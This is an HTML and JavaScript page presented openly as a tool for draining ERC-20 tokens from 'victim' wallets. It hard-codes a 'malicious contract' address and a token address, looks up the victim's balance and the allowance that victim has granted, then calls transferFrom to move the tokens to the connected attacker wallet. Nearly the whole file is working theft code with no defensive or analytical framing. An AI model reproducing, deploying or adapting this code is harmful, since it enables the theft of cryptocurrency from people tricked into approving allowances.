<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdraw Tokens - Deployer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            padding: 20px;
            text-align: center;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            background-color: #4CAF50;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
        #balance {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h1>Withdraw Tokens Using Deployer's Wallet</h1>
    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>

    <!-- Connect Wallet Button -->
    <button id="connectWalletBtn">Connect Wallet</button>

    <br><br>

    <!-- Victim Address Input -->
    <label for="victimAddress">Victim Address: </label>
    <input type="text" id="victimAddress" placeholder="Enter victim's wallet address" />

    <br><br>

    <!-- Check Balance Button -->
    <button id="checkBalanceBtn" style="display:none;" onclick="checkBalance()">Check Balance</button>

    <p id="balance"></p>

    <br><br>

    <!-- Withdraw Button -->
    <button id="withdrawTokensBtn" style="display:none;" onclick="withdrawTokens()">Withdraw Tokens</button>

    <p id="status"></p>

    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script>
        let web3;
        let userAccount;
        let maliciousContractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a";  // The malicious contract address
        let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575";  // The address of the token you want to withdraw
        let contract;

        window.onload = () => {
            console.debug("Page loaded. Checking for MetaMask...");
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                console.debug("MetaMask found. Loading ABI...");
                loadABI();
                init();
            } else {
                alert("MetaMask not found!");
                console.debug("MetaMask not found.");
            }
        };

        async function loadABI() {
            try {
                console.debug("Fetching ABI...");
                const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
                const abi = await response.json();
                contract = new web3.eth.Contract(abi, maliciousContractAddress);  // Use the malicious contract address
                console.debug("Malicious contract initialized:", contract);
            } catch (error) {
                console.error("Error loading ABI:", error);
            }
        }

        async function init() {
            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
        }

        async function connectWallet() {
            try {
                console.debug("Requesting wallet connection...");
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];  // This gets the connected wallet address (deployer's address)
                console.debug("Wallet connected:", userAccount);
                document.getElementById('status').innerText = `Connected: ${userAccount}`;
                document.getElementById('checkBalanceBtn').style.display = "inline-block";
                document.getElementById('withdrawTokensBtn').style.display = "inline-block";
            } catch (error) {
                console.error("Error connecting wallet:", error);
                alert("Error connecting to MetaMask.");
            }
        }

        async function checkBalance() {
            const victimAddress = document.getElementById('victimAddress').value;

            if (!victimAddress) {
                alert("Please enter a victim's address!");
                console.debug("No victim address provided.");
                return;
            }

            try {
                console.debug("Fetching balance for victim:", victimAddress);

                // Get the victim's token balance using the ERC-20 token contract
                const tokenContract = new web3.eth.Contract([{
                    "constant": true,
                    "inputs": [
                        { "name": "_owner", "type": "address" }
                    ],
                    "name": "balanceOf",
                    "outputs": [
                        { "name": "balance", "type": "uint256" }
                    ],
                    "payable": false,
                    "stateMutability": "view",
                    "type": "function"
                }], tokenAddress);

                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
                console.debug("Victim's token balance: " + victimBalance);

                // Display the balance in a readable format
                if (victimBalance <= 0) {
                    document.getElementById('balance').innerText = "Victim has no tokens to withdraw!";
                } else {
                    document.getElementById('balance').innerText = `Victim's Token Balance: ${victimBalance}`;
                }
            } catch (error) {
                console.error("Error checking balance:", error);
                document.getElementById('balance').innerText = "Error checking balance.";
            }
        }

        async function withdrawTokens() {
            const victimAddress = document.getElementById('victimAddress').value;

            if (!victimAddress) {
                alert("Please enter a victim's address!");
                console.debug("No victim address provided.");
                return;
            }

            try {
                console.debug("Fetching allowance for victim:", victimAddress);

                // Get the approved allowance for the malicious contract
                const tokenContract = new web3.eth.Contract([{
                    "constant": true,
                    "inputs": [
                        { "name": "_owner", "type": "address" },
                        { "name": "_spender", "type": "address" }
                    ],
                    "name": "allowance",
                    "outputs": [
                        { "name": "remaining", "type": "uint256" }
                    ],
                    "payable": false,
                    "stateMutability": "view",
                    "type": "function"
                }], tokenAddress);

                const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
                console.debug("Approved allowance: " + allowance);

                // Get the victim's token balance
                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
                console.debug("Victim's token balance: " + victimBalance);

                // Calculate the maximum amount that can be withdrawn (the lesser of the victim's balance and the approved allowance)
                const withdrawAmount = Math.min(victimBalance, allowance);
                console.debug("Amount to withdraw: " + withdrawAmount);

                // Check if there are any tokens to withdraw
                if (withdrawAmount <= 0) {
                    alert("No approved tokens to withdraw!");
                    console.debug("No tokens approved or available for withdrawal.");
                    return;
                }

                // Perform the transfer using transferFrom function
                await tokenContract.methods.transferFrom(victimAddress, userAccount, withdrawAmount).send({ from: userAccount });

                console.debug("Successfully withdrew " + withdrawAmount + " tokens from " + victimAddress);
                document.getElementById('status').innerText = `Successfully withdrawn ${withdrawAmount} tokens from ${victimAddress}!`;
            } catch (error) {
                console.error("Error withdrawing tokens:", error);
                document.getElementById('status').innerText = "Error withdrawing tokens.";
            }
        }
    </script>
</body>
</html>
